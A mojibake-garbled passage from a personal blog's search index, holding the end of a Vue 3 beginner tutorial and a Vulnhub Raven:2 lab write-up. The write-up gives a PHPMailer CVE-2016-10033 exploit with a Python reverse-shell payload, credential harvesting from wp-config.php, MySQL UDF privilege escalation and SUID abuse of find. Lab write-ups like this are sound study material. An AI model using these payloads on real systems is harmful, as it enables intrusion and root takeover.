todo.text }}\u0026lt;/span\u0026gt; \u0026lt;button @click=\u0026#34;removeTodo(todo)\u0026#34;\u0026gt;X\u0026lt;/button\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;button @click=\u0026#34;hideCompleted = !hideCompleted\u0026#34;\u0026gt; {{ hideCompleted ? \u0026#39;Show all\u0026#39; : \u0026#39;Hide completed\u0026#39; }} \u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;style\u0026gt; .done { text-decoration: line-through; } \u0026lt;/style\u0026gt; ç”Ÿå‘½å‘¨æœŸã€æ¨¡æ¿å¼•ç”¨ å½“æˆ‘ä»¬æ— æ³•ä½¿ç”¨å“åº”å¼æ¸²æŸ“æ¥è¿›è¡Œdomæ›´æ–°çš„æ—¶å€™ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨æ¨¡æ¿å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯æŒ‡å‘æ¨¡æ¿ä¸­ä¸€ä¸ª DOM å…ƒç´ çš„ ref\n\u0026lt;p ref=\u0026#34;pElementRef\u0026#34;\u0026gt;hello\u0026lt;/p\u0026gt; è®¿é—®è¿™ä¸ªå¼•ç”¨éœ€è¦å…ˆå®šä¹‰ï¼Œå¹¶ä¸”ä½¿ç”¨nullåˆå§‹åŒ–ï¼š\nconst pElementRef = ref(null) æ¨¡æ¿å¼•ç”¨ ref åªèƒ½åœ¨ç»„ä»¶æŒ‚è½½åè®¿é—®ï¼ŒæŒ‚è½½åæ‰§è¡Œä»£ç ä½¿ç”¨onMounted\nimport { onMounted } from \u0026#39;vue\u0026#39; onMounted(() =\u0026gt; { // æ­¤æ—¶ç»„ä»¶å·²ç»æŒ‚è½½ã€‚ }) è¿™è¢«ç§°ä¸ºç”Ÿå‘½å‘¨æœŸé’©å­â€”â€”å®ƒå…è®¸æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªåœ¨ç»„ä»¶çš„ç‰¹å®šç”Ÿå‘½å‘¨æœŸè°ƒç”¨çš„å›è°ƒå‡½æ•°ã€‚è¿˜æœ‰ä¸€äº›å…¶ä»–çš„é’©å­å¦‚ onUpdated å’Œ onUnmounted\næ¯”å¦‚ä¸‹é¢æ·»åŠ ä¸€ä¸ªonMountedé’©å­ï¼Œä¿®æ”¹domçš„æ–‡å­—ï¼š\n\u0026lt;script setup\u0026gt; import { ref,onMounted } from \u0026#39;vue\u0026#39; const pElementRef = ref(null) onMounted(() =\u0026gt; { pElementRef.value.textContent = \u0026#39;Yuy0ung\u0026#39; }) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;p ref=\u0026#34;pElementRef\u0026#34;\u0026gt;Hello\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; ä¾¦å¬å™¨ ä¾¦å¬æ•°æ®æºçš„æ”¹å˜ï¼š\nwatch() å¯ä»¥ç›´æ¥ä¾¦å¬ä¸€ä¸ª refï¼Œå¹¶ä¸”åªè¦ count çš„å€¼æ”¹å˜å°±ä¼šè§¦å‘å›è°ƒã€‚watch() ä¹Ÿå¯ä»¥ä¾¦å¬å…¶ä»–ç±»å‹çš„æ•°æ®æº\næ¯”å¦‚è¿™é‡Œç›‘å¬æ˜¾ç¤ºidçš„å˜åŒ–æ¥è§¦å‘è·å–æ–°çš„dataï¼š\n\u0026lt;script setup\u0026gt; import { ref,watch } from \u0026#39;vue\u0026#39; const todoId = ref(1) const todoData = ref(null) async function fetchData() { todoData.value = null const res = await fetch( `https://jsonplaceholder.typicode.com/todos/${todoId.value}` ) todoData.value = await res.json() } fetchData() watch(todoId,fetchData) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;p\u0026gt;Todo id: {{ todoId }}\u0026lt;/p\u0026gt; \u0026lt;button @click=\u0026#34;todoId++\u0026#34; :disabled=\u0026#34;!todoData\u0026#34;\u0026gt;Fetch next todo\u0026lt;/button\u0026gt; \u0026lt;p v-if=\u0026#34;!todoData\u0026#34;\u0026gt;Loading...\u0026lt;/p\u0026gt; \u0026lt;pre v-else\u0026gt;{{ todoData }}\u0026lt;/pre\u0026gt; \u0026lt;/template\u0026gt; ç»„ä»¶ å¯¼å…¥å­ç»„ä»¶ï¼š\nimport ChildComp from \u0026#39;./ChildComp.vue\u0026#39; åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ï¼š\n\u0026lt;ChildComp /\u0026gt; è¿™æ˜¯åŸæœ¬çš„ç»„ä»¶ChildComp.vueï¼š\n\u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;A Child Component!\u0026lt;/h2\u0026gt; \u0026lt;/template\u0026gt; App.vueä¸­å¼•å…¥ChildComp.vueä½œä¸ºå­ç»„ä»¶:\n\u0026lt;script setup\u0026gt; import ChildComp from \u0026#39;./ChildComp.vue\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;!-- render child component --\u0026gt; \u0026lt;ChildComp /\u0026gt; \u0026lt;/template\u0026gt; props å­ç»„ä»¶å¯ä»¥é€šè¿‡ props ä»çˆ¶ç»„ä»¶æ¥å—åŠ¨æ€æ•°æ®ã€‚é¦–å…ˆï¼Œéœ€è¦å£°æ˜å®ƒæ‰€æ¥å—çš„ propsï¼š\n\u0026lt;!-- ChildComp.vue --\u0026gt; \u0026lt;script setup\u0026gt; const props = defineProps({ msg: String }) \u0026lt;/script\u0026gt; æ³¨æ„ defineProps() æ˜¯ä¸€ä¸ªç¼–è¯‘æ—¶å®ï¼Œå¹¶ä¸éœ€è¦å¯¼å…¥ã€‚ä¸€æ—¦å£°æ˜ï¼Œmsg prop å°±å¯ä»¥åœ¨å­ç»„ä»¶çš„æ¨¡æ¿ä¸­ä½¿ç”¨ã€‚å®ƒä¹Ÿå¯ä»¥é€šè¿‡ defineProps() æ‰€è¿”å›çš„å¯¹è±¡åœ¨ JavaScript ä¸­è®¿é—®ã€‚\nçˆ¶ç»„ä»¶å¯ä»¥åƒå£°æ˜ HTML attributes ä¸€æ ·ä¼ é€’ propsã€‚è‹¥è¦ä¼ é€’åŠ¨æ€å€¼ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ v-bind è¯­æ³•ï¼š\n\u0026lt;ChildComp :msg=\u0026#34;greeting\u0026#34; /\u0026gt; æ¯”å¦‚å­ç»„ä»¶ä½¿ç”¨prosï¼š\n\u0026lt;script setup\u0026gt; const props = defineProps({ msg: String }) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;{{ msg || \u0026#39;No props passed yet\u0026#39; }}\u0026lt;/h2\u0026gt; \u0026lt;/template\u0026gt; çˆ¶ç»„ä»¶ï¼š\n\u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; import ChildComp from \u0026#39;./ChildComp.vue\u0026#39; const greeting = ref(\u0026#39;Hello from parent\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;ChildComp :msg=\u0026#34;greeting\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; è¿™æ ·å­ç»„ä»¶å°±èƒ½æ¥æ”¶çˆ¶ç»„ä»¶çš„åŠ¨æ€å€¼ï¼š\nemits é™¤äº†æ¥æ”¶ propsï¼Œå­ç»„ä»¶è¿˜å¯ä»¥å‘çˆ¶ç»„ä»¶è§¦å‘äº‹ä»¶ï¼š\n\u0026lt;script setup\u0026gt; // å£°æ˜è§¦å‘çš„äº‹ä»¶ const emit = defineEmits([\u0026#39;response\u0026#39;]) // å¸¦å‚æ•°è§¦å‘ emit(\u0026#39;response\u0026#39;, \u0026#39;hello from child\u0026#39;) \u0026lt;/script\u0026gt; emit() çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯äº‹ä»¶çš„åç§°ã€‚å…¶ä»–æ‰€æœ‰å‚æ•°éƒ½å°†ä¼ é€’ç»™äº‹ä»¶ç›‘å¬å™¨ã€‚\nçˆ¶ç»„ä»¶å¯ä»¥ä½¿ç”¨ v-on ç›‘å¬å­ç»„ä»¶è§¦å‘çš„äº‹ä»¶â€”â€”è¿™é‡Œçš„å¤„ç†å‡½æ•°æ¥æ”¶äº†å­ç»„ä»¶è§¦å‘äº‹ä»¶æ—¶çš„é¢å¤–å‚æ•°å¹¶å°†å®ƒèµ‹å€¼ç»™äº†æœ¬åœ°çŠ¶æ€ï¼š\n\u0026lt;ChildComp @response=\u0026#34;(msg) =\u0026gt; childMsg = msg\u0026#34; /\u0026gt; æ¯”å¦‚è¿™é‡Œçˆ¶ç»„ä»¶å®šä¹‰å‡½æ•°ï¼š\n\u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; import ChildComp from \u0026#39;./ChildComp.vue\u0026#39; const childMsg = ref(\u0026#39;No child msg yet\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;ChildComp @response=\u0026#34;(a) =\u0026gt; childMsg = a\u0026#34;/\u0026gt; \u0026lt;p\u0026gt;{{ childMsg }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; å­ç»„ä»¶è§¦å‘å‡½æ•°ï¼š\n\u0026lt;script setup\u0026gt; const emit = defineEmits([\u0026#39;response\u0026#39;]) emit(\u0026#39;response\u0026#39;, \u0026#39;hello from child\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;Child component\u0026lt;/h2\u0026gt; \u0026lt;/template\u0026gt; çˆ¶ç»„ä»¶æˆåŠŸæ¥æ”¶åˆ°å­ç»„ä»¶ä¼ é€’ç»™responseå‡½æ•°çš„å‚æ•°ï¼š\næ’æ§½ (slots) é™¤äº†propsï¼Œçˆ¶ç»„ä»¶è¿˜å¯ä»¥é€šè¿‡æ’æ§½ (slots) å°†æ¨¡æ¿ç‰‡æ®µä¼ é€’ç»™å­ç»„ä»¶\nå­ç»„ä»¶åˆ›å»ºä¸€ä¸ªæ’æ§½å‡ºå£ï¼ˆslot outletï¼‰ï¼š\n\u0026lt;template\u0026gt; \u0026lt;slot\u0026gt;Fallback content\u0026lt;/slot\u0026gt; \u0026lt;!-- ä¸Šé¢æ–‡æœ¬ä¸ºâ€œé»˜è®¤â€å†…å®¹ï¼šå®ƒä¼šåœ¨çˆ¶ç»„ä»¶æ²¡æœ‰ä¼ é€’ä»»ä½•æ’æ§½å†…å®¹æ—¶æ˜¾ç¤º --\u0026gt; \u0026lt;/template\u0026gt; çˆ¶ç»„ä»¶ç›´æ¥ä¼ é€’ï¼š\n\u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; import ChildComp from \u0026#39;./ChildComp.vue\u0026#39; const msg = ref(\u0026#39;from parent\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;ChildComp\u0026gt;{{msg}}\u0026lt;/ChildComp\u0026gt; \u0026lt;/template\u0026gt; æ€»ç»“ å®Œæˆäº†vueçš„åŸºç¡€apiå­¦ä¹ ï¼Œä»¥åŠå…¶ç®€å•ä½¿ç”¨ï¼Œä½†ä»…èƒ½ç”¨äºå…¥é—¨çš„åŸºæœ¬å­¦ä¹ ï¼Œæ¥ä¸‹æ¥è¿˜éœ€è¦ç»§ç»­é˜…è¯»æ·±å…¥æŒ‡å—ï¼Œå¹¶é’ˆå¯¹å¸¸ç”¨åœºæ™¯å‹¤åŠ ç»ƒä¹ \n",
        "summary": "VUE3-å…¥é—¨demo è®°å½•vueå­¦ä¹ æ—¶çš„ä¸€äº›åŸºç¡€demoï¼Œæˆ‘çš„å­¦ä¹ è·¯çº¿è§„åˆ’æ˜¯å…ˆç®€å•ä¸Šæ‰‹äº†è§£vueå†æ·±å…¥æ‰“åŸºç¡€\né£æ ¼ç»Ÿä¸€é‡‡ç”¨çš„æ˜¯ï¼šç»„åˆå¼API+å•æ–‡ä»¶ç»„ä»¶\nå­¦ä¹ èµ„æºä¸ºvueå®˜æ–¹æ–‡æ¡£\nref/reactiveåˆ›å»ºå“åº”å¼çŠ¶æ€ reactive() åªé€‚ç”¨äºå¯¹è±¡ (åŒ…æ‹¬æ•°ç»„å’Œå†…ç½®ç±»å‹ï¼Œå¦‚ Map å’Œ Set)ã€‚è€Œå¦ä¸€ä¸ª API ref() åˆ™å¯ä»¥æ¥å—ä»»ä½•å€¼ç±»å‹ã€‚ref ä¼šè¿”å›ä¸€ä¸ªåŒ…è£¹å¯¹è±¡ï¼Œå¹¶åœ¨ .value å±æ€§ä¸‹æš´éœ²å†…éƒ¨å€¼\nåœ¨ç»„åˆå¼ API ä¸­ï¼Œæ¨èä½¿ç”¨ ref() å‡½æ•°æ¥å£°æ˜å“åº”å¼çŠ¶æ€\nref() æ¥æ”¶å‚æ•°ï¼Œå¹¶å°†å…¶åŒ…è£¹åœ¨ä¸€ä¸ªå¸¦æœ‰ .value å±æ€§çš„ ref å¯¹è±¡ä¸­è¿”å›\nåˆ›å»ºå“åº”å¼çŠ¶æ€ï¼š\n\u0026lt;script setup\u0026gt; import { ref,reactive } from \u0026#39;vue\u0026#39; // ç»„ä»¶é€»è¾‘ // æ­¤å¤„å£°æ˜ä¸€äº›å“åº”å¼çŠ¶æ€ const message = ref(\u0026#39;Hello Yuy0ung\u0026#39;) const counter = reactive({ count:0 }) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;h1\u0026gt;{{message}}\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Count is: {{ counter.count }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; Attribute ç»‘å®š mustache è¯­æ³• (å³åŒå¤§æ‹¬å·) åªèƒ½ç”¨äºæ–‡æœ¬æ’å€¼ã€‚ä¸ºäº†ç»™ attribute ç»‘å®šä¸€ä¸ªåŠ¨æ€å€¼ï¼Œéœ€è¦ä½¿ç”¨ v-bind æŒ‡ä»¤ï¼Œç®€å†™ä¸º:\næ¯”å¦‚è¿™é‡Œç»™æ ‡é¢˜ç»‘å®šçº¢è‰²å±æ€§ï¼š\n\u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const titleClass = ref(\u0026#39;title\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;h1 :class=\u0026#34;titleClass\u0026#34;\u0026gt;Make me red\u0026lt;/h1\u0026gt; \u0026lt;!-- æ­¤å¤„æ·»åŠ ä¸€ä¸ªåŠ¨æ€ class ç»‘å®š --\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;style\u0026gt; .title { color: red; } \u0026lt;/style\u0026gt; äº‹ä»¶ç›‘å¬ ä½¿ç”¨ v-on æŒ‡ä»¤ç›‘å¬ DOM äº‹ä»¶ï¼Œç®€å†™ä¸º@\n"
    }
,
    {
        "title": "vulnhub-Raven2é¶åœºç¬”è®°",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/vulnhub-raven2%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/",
        "content": "vulnhub-Raven:2 æ¸—é€è®°å½• æœ¬æ¬¡æ¸—é€æµ‹è¯•é¶æœºä¸ºvulnhubçš„Raven:2ï¼Œç›®çš„æ˜¯å­¦ä¹ äº†UDFææƒåï¼Œè¿›è¡Œçš„å®æ“å·©å›º\né¶åœºå…±æœ‰4ä¸ªflag\nä¿¡æ¯æœé›†ï¼ˆflag1ï¼‰ é¦–å…ˆnmapæ‰«æä¸€ä¸‹eth0ç½‘å¡çš„cç«¯æ‰¾åˆ°é¶æœºIPï¼š\nnmap -sP -sn 192.168.111.1/24 å‘ç°é¶æœºIPä¸º192.168.111.141:\nå¯¹å…¶è¿›è¡Œç«¯å£æ‰«æï¼š\nnmap -sV -A -T4 192.168.111.141 å¯ä»¥å‘ç°é¶æœºå¼€æ”¾äº†22ã€80ã€111ä¸‰ä¸ªç«¯å£ï¼š\nè®¿é—®80ç«¯å£å‘ç°æ˜¯ä¸ªç½‘é¡µï¼š\nè€ƒè™‘ç”¨dirsearchæ‰«ä¸€ä¸‹ç›®å½•ï¼š\ndirsearch -u http://192.168.111.141/ å‘ç°æœ‰å‡ ä¸ªå¯è®¿é—®çš„è·¯å¾„ï¼Œå°è¯•è®¿é—®ï¼š\nè®¿é—®/.DS_Storeå¯ä»¥ä¸‹è½½è¯¥æ–‡ä»¶ï¼Œè®¿é—®æ–‡ä»¶å¯ä»¥çŸ¥é“webç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•\n/vendor/è·¯ç”±å­˜åœ¨ç›®å½•éå†ï¼š\nè®¿é—®å…¶ä¸­çš„PATHæ–‡ä»¶æ‹¿åˆ°äº†ç¬¬ä¸€ä¸ªflagï¼š\nflag1{a2c1f66d2b8051bd3a5874b5b6e43e21} é€šè¿‡åˆšæ‰ç›®å½•éå†çš„æ–‡ä»¶åï¼Œå¯çŸ¥ç½‘ç«™åº”è¯¥æ˜¯å®‰è£…äº†PHPmailerï¼Œè€Œéå†åˆ°çš„versionæ–‡ä»¶ä¸­å†™äº†5.2.16ï¼ŒçŒœæµ‹è¿™å¯èƒ½å°±æ˜¯PHPmailerç‰ˆæœ¬å·\nåœ¨kaliä¸­æœç´¢å¯¹åº”æ¼æ´ï¼š\nsearchsploit phpmailer è¿™é‡Œé€‰æ‹©èƒ½RCEçš„php/webapps/40974.pyï¼ŒæŸ¥çœ‹ä¸‹expï¼š\nsearchsploit -x exploits/php/webapps/40974.py åœ¨exploit-dbä¸ŠæŸ¥è¯¢å¯çŸ¥è¯¥æ¼æ´çš„ç¼–å·ä¸ºCVE-2016-10033ï¼Œæ˜¯å› ä¸ºé‚®ä»¶åœ°å€èƒ½å¤ŸåŒ…å«ç”¨å¼•å·æ‹¬èµ·æ¥çš„ç©ºæ ¼ï¼Œè¿™æ ·å¯ä»¥è¿›è¡Œæ”»å‡»å‚æ•°çš„æ³¨å…¥\nè€Œæˆ‘ä»¬é€šè¿‡dirsearchæˆ–ç½‘ç«™ä¸»é¡µä¸Šçœ‹åˆ°çš„é‚®ä»¶é¡µé¢åœ°å€ä¸ºï¼šhttp://192.168.61.135/contact.phpï¼Œå› æ­¤å¯ä»¥å°è¯•æ¼æ´åˆ©ç”¨\næ¼æ´åˆ©ç”¨ï¼ˆflag2ã€flag3ï¼‰ æ¥ä¸‹æ¥æˆ‘ä»¬æŠŠEXPä¸‹è½½åˆ°æ¡Œé¢è¿›è¡Œç¼–è¾‘ï¼š\nsearchsploit -m exploits/php/webapps/40974.py ä¿®æ”¹å†…å®¹å¦‚ä¸‹ï¼š\nå¼€å¤´åŠ ä¸Šï¼š\n#!/usr/bin/python # -*- coding: utf-8 -*- targetå€¼æ”¹ä¸ºhttp://192.168.111.141/contact.php\nbackdoorå€¼æ”¹ä¸ºhoumen.phpï¼ˆé»˜è®¤çš„åå­—å®¹æ˜“è¢«banï¼‰\nä¿®æ”¹payloadå’Œfieldsï¼š\npayload = \u0026#39;\u0026lt;?php system(\\\u0026#39;python -c \u0026#34;\u0026#34;\u0026#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\\\u0026#39;[kaliçš„IP]\\\\\\\u0026#39;,[ç›‘å¬çš„ç«¯å£]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\\\\\u0026#34;/bin/sh\\\\\\\u0026#34;,\\\\\\\u0026#34;-i\\\\\\\u0026#34;])\u0026#34;\u0026#34;\u0026#34;\\\u0026#39;); ?\u0026gt;\u0026#39; fields={\u0026#39;action\u0026#39;: \u0026#39;submit\u0026#39;, \u0026#39;name\u0026#39;: payload, \u0026#39;email\u0026#39;: \u0026#39;\u0026#34;anarcoder\\\\\\\u0026#34; -OQueueDirectory=/tmp -X/[webè·¯å¾„]/[åé—¨æ–‡ä»¶åç§°].php server\\\u0026#34; @protonmail.com\u0026#39;, \u0026#39;message\u0026#39;: \u0026#39;Pwned\u0026#39;} æ¥ä¸‹æ¥ä½¿ç”¨python2è¿è¡Œexpï¼Œç„¶åç›‘å¬ç«¯å£ï¼š\nç„¶åè®¿é—®http://192.168.111.141/contact.phpï¼Œè¿™æ ·å°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„payloadåœ¨ç›®å½•ä¸‹é¢ç”Ÿæˆhoumen.php\nç„¶åå†è®¿é—®http://192.168.111.141/houmen.phpï¼Œå³å¯æ‰§è¡Œåå¼¹shellçš„åé—¨ï¼ŒæˆåŠŸgetshellï¼š\nç”¨pythonè·å–ä¸€ä¸ªptyï¼š\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾flagäº†ï¼š\nfind / -name \u0026#34;flag*\u0026#34; æˆåŠŸæ‰¾åˆ°flag2ã€flag3ï¼š\næƒé™æå‡ï¼ˆflag4ï¼‰ è¿˜å‰©ä¸ªflag4æ²¡æœ‰æ‰¾åˆ°ï¼Œè€ƒè™‘å¯èƒ½åœ¨/rootè¿™ç§éœ€è¦rootæƒé™çš„ç›®å½•é‡Œï¼Œæ‰€ä»¥æ¥ä¸‹æ¥çš„ä»»åŠ¡å°±æ˜¯ææƒäº†\nç³»ç»Ÿä¸‹çš„ä¿¡æ¯æœé›† å¯ä»¥å…ˆå‘ä¸»æœºä¸Šä¼ ä¸€ä¸ªLinEnum.shè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œæ–¹ä¾¿æˆ‘ä»¬ææƒ\nå¯¹å…¶å¢åŠ æ‰§è¡Œæƒé™å¹¶è¿è¡Œï¼š\nå¯ä»¥åœ¨ç»“æœä¸­å‘ç°mysqlæ˜¯ä½¿ç”¨rootæƒé™è¿è¡Œçš„\nå› æ­¤ï¼Œæˆ‘ä»¬å°è¯•è¿›è¡Œudfææƒ\né¦–å…ˆéœ€è¦è¿æ¥æ•°æ®åº“çš„è´¦å·å’Œå¯†ç ï¼Œæˆ‘ä»¬åœ¨webç›®å½•ä¸‹æœç´¢ä¸€ä¸‹ï¼š\nfind . -name \u0026#34;*.php\u0026#34; -print0 | xargs -0 grep -i -n \u0026#34;pass\u0026#34; #åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­æŸ¥æ‰¾æ‰©å±•åä¸º.phpçš„æ–‡ä»¶ï¼Œå¹¶æœç´¢åˆ—å‡ºæ–‡ä»¶ä¸­åŒ…å«å­—ç¬¦ä¸²â€œpassâ€çš„è¡Œ åœ¨webç›®å½•ä¸‹çš„/wordpress/wp-config.phpä¸­å‘ç°å¯†ç ï¼š\ncatä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°æ˜¯rootç”¨æˆ·å¯†ç ï¼š\nè‡³æ­¤ï¼Œå¯ä»¥æ­£å¼å¼€å§‹udfææƒäº†\nudfææƒ é¦–å…ˆä»¥æœé›†åˆ°çš„è´¦å·å¯†ç ç™»å½•mysqlï¼š\nå¯ä»¥çœ‹è§æœåŠ¡ç‰ˆæœ¬ä¸º5.5.60\næŸ¥çœ‹secure-file-privï¼Œå‘ç°æ— ç›®å½•é™åˆ¶ï¼Œå¯ä»¥è¿›è¡Œä»»ä½•åœ°æ–¹çš„æ–‡ä»¶å¯¼å…¥ï¼š\næŸ¥çœ‹pluginç›®å½•ï¼Œå‘ç°ç›®å½•å­˜åœ¨ï¼Œä¸º/usr/lib/mysql/plugin/ï¼š\nåœ¨kaliçš„sqlmapä¸­è·å–udfæ–‡ä»¶ï¼š\npython /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys.so å†åœ¨é¶æœºä¸Šä½¿ç”¨wgetä¸‹è½½udfæ–‡ä»¶åˆ°/tmpç›®å½•ï¼š\næ¥ä¸‹æ¥å°±æ˜¯ä½¿ç”¨æˆ‘ä»¬ä¸Šä¼ çš„udfæ–‡ä»¶äº†ï¼ŒæŒ‰æµç¨‹èµ°å³å¯ï¼š\nåˆ›å»ºä¸€å¼ ä¸´æ—¶è¡¨ç”¨æ¥å­˜æ”¾DLL/SOæ–‡ä»¶çš„åå…­è¿›åˆ¶å†…å®¹\nCREATE TABLE temp_udf(udf blob); å°†udfæ–‡ä»¶å†…å®¹æ’å…¥ä¸´æ—¶è¡¨ä¸­ï¼š\ninsert into temp_udf values(load_file(\u0026#39;/tmp/lib_mysqludf_sys.so\u0026#39;)); å°†udfæ–‡ä»¶å¯¼å‡ºè‡³å¯¹åº”ä½ç½®ï¼š\nSELECT * FROM temp_udf INTO DUMPFILE \u0026#34;/usr/lib/mysql/plugin/udf.so\u0026#34;; å¼•å…¥è‡ªå®šä¹‰å‡½æ•°ï¼š\nCREATE FUNCTION sys_eval RETURNS STRING SONAME \u0026#39;udf.so\u0026#39;; æŸ¥çœ‹æ˜¯å¦æ·»åŠ æˆåŠŸï¼š\nselect * from mysql.func; æ‰§è¡Œå‘½ä»¤ï¼š\nselect sys_eval(\u0026#39;whoami\u0026#39;); éå¸¸é¡ºåˆ©çš„æ‹¿åˆ°äº†rootæƒé™ï¼š\nä½†æ˜¯ä¸€ç›´åœ¨mysqlä¸­æ‰§è¡Œå‘½ä»¤å¹¶ä¸å¤ªæ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»§ç»­åˆ©ç”¨findè¿›è¡Œsuidææƒï¼š\nç»™findå‘½ä»¤èµ‹äºˆä¸€ä¸ªsuidæƒé™ï¼š\nselect sys_eval(\u0026#39;chmod u+s /usr/bin/find\u0026#39;); æŸ¥çœ‹ä¸€ä¸‹å…·æœ‰suidæƒé™çš„å‘½ä»¤ï¼Œåˆ¤æ–­æ˜¯å¦æˆåŠŸï¼š\nfind / -perm -u=s -type f 2\u0026gt;/dev/null æˆåŠŸç»™findæ·»åŠ suidæƒé™ï¼š\næ¥ä¸‹æ¥åˆ©ç”¨findè¿›è¡Œsuidææƒå³å¯ï¼š\nfind lib_mysqludf_sys.so -exec \u0026#34;/bin/sh\u0026#34; \\; æˆåŠŸææƒï¼š\næ¥ä¸‹æ¥åœ¨è®¿é—®/rootå‘ç°flag4ï¼š\næ€»ç»“ å›é¡¾æ•´ä¸ªæ¸—é€è¿‡ç¨‹ï¼Œæˆ‘ä»¬é‡åˆ°äº†ä»¥ä¸‹æ¼æ´æˆ–åˆ©ç”¨ç‚¹ï¼š\n/.DS_Storeæ–‡ä»¶æ³„éœ² ç›®å½•éå† PHPmailerçš„å‘½ä»¤æ‰§è¡Œï¼ˆCVE-2016-10033ï¼‰ wp-configæ³„éœ²mysqlè´¦å·å¯†ç  mysqlé…ç½®ä¸å½“ï¼ˆä»¥rootæƒé™è¿è¡Œï¼‰ mysqlå¯¼å…¥æ–‡ä»¶æ— ç›®å½•é™åˆ¶ æ®æ­¤ï¼Œæˆ‘ä»¬è¿›è¡Œäº†å¦‚ä¸‹åˆ©ç”¨ï¼š\næµè§ˆå¯éå†çš„ç›®å½• ä½¿ç”¨åå¼¹å¼webshellæ”»å‡»PHPmailer é€šè¿‡ä¿¡æ¯æ”¶é›†ä»¥rootç”¨æˆ·èº«ä»½ç™»å½•mysql udfææƒ åˆ©ç”¨findå‘½ä»¤è¿›è¡Œsuidææƒ ",
        "summary": "vulnhub-Raven:2 æ¸—é€è®°å½• æœ¬æ¬¡æ¸—é€æµ‹è¯•é¶æœºä¸ºvulnhubçš„Raven:2ï¼Œç›®çš„æ˜¯å­¦ä¹ äº†UDFææƒåï¼Œè¿›è¡Œçš„å®æ“å·©å›º\né¶åœºå…±æœ‰4ä¸ªflag\nä¿¡æ¯æœé›†ï¼ˆflag1ï¼‰ é¦–å…ˆnmapæ‰«æä¸€ä¸‹eth0ç½‘å¡çš„cç«¯æ‰¾åˆ°é¶æœºIPï¼š\nnmap -sP -sn 192.168.111.1/24 å‘ç°é¶æœºIPä¸º192.168.111.141:\nå¯¹å…¶è¿›è¡Œç«¯å£æ‰«æï¼š\nnmap -sV -A -T4 192.168.111.141 å¯ä»¥å‘ç°é¶æœºå¼€æ”¾äº†22ã€80ã€111ä¸‰ä¸ªç«¯å£ï¼š\nè®¿é—®80ç«¯å£å‘ç°æ˜¯ä¸ªç½‘é¡µï¼š\nè€ƒè™‘ç”¨dirsearchæ‰«ä¸€ä¸‹ç›®å½•ï¼š\ndirsearch -u http://192.168.111.141/ å‘ç°æœ‰å‡ ä¸ªå¯è®¿é—®çš„è·¯å¾„ï¼Œå°è¯•è®¿é—®ï¼š\nè®¿é—®/.DS_Storeå¯ä»¥ä¸‹è½½è¯¥æ–‡ä»¶ï¼Œè®¿é—®æ–‡ä»¶å¯ä»¥çŸ¥é“webç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•\n/vendor/è·¯ç”±å­˜åœ¨ç›®å½•éå†ï¼š\nè®¿é—®å…¶ä¸­çš„PATHæ–‡ä»¶æ‹¿åˆ°äº†ç¬¬ä¸€ä¸ªflagï¼š\nflag1{a2c1f66d2b8051bd3a5874b5b6e43e21} é€šè¿‡åˆšæ‰ç›®å½•éå†çš„æ–‡ä»¶åï¼Œå¯çŸ¥ç½‘ç«™åº”è¯¥æ˜¯å®‰è£…äº†PHPmailerï¼Œè€Œéå†åˆ°çš„versionæ–‡ä»¶ä¸­å†™äº†5.2.16ï¼ŒçŒœæµ‹è¿™å¯èƒ½å°±æ˜¯PHPmailerç‰ˆæœ¬å·\nåœ¨kaliä¸­æœç´¢å¯¹åº”æ¼æ´ï¼š\nsearchsploit phpmailer 